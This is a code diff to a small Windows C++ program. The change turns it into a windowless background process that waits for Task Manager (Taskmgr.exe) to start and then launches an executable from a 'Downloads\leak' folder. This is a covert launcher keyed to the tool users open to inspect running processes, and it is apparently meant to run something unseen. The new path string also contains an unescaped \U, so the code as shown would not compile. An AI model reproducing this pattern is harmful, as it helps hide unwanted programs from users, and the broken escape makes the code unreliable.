@@ -21,20 +21,22 @@ bool IsProcessRunning(const wchar_t* name) {
     return false;
 }
 
-int main() {
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
-
-    const wchar_t* watchFor = L"notepad.exe";
-    const wchar_t* launchPath = L"C:\\Program Files\\MyApp\\example.exe";
+int WINAPI wWinMain(
+    HINSTANCE hInstance,
+    HINSTANCE,
+    PWSTR,
+    int
+) {
+    const wchar_t* watchFor = L"Taskmgr.exe";
+    const wchar_t* launchPath = L"C:\Users\\example\\Downloads\\leak\\app.exe";
 
     while (true) {
         if (IsProcessRunning(watchFor)) {
-            Sleep(3000);
-            ShellExecuteW(NULL, L"open", launchPath, NULL, NULL, SW_SHOWNORMAL);
+            Sleep(1000);
+            ShellExecuteW(nullptr, L"open", launchPath, nullptr, nullptr, SW_SHOWNORMAL);
             break;
         }
-        Sleep(1000); 
+        Sleep(1000);
     }
 
     return 0;
